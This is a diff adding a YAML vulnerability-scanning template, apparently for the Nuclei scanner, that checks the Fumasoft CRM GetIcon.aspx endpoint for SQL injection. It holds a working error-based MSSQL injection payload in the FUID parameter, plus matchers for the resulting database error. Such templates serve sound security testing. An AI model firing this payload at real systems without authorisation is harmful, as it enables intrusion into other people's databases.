@@ -1,0 +1,30 @@
+id: poc-yaml-fumasoft-geticon-ashx-sqli
+info:
+  name: 孚盟云 GetIcon.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(100, 1000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/Common/GetIcon.aspx?FUID=-1'and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "FumaCRM"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型.*?时失败"
+          - "在将.*?值"
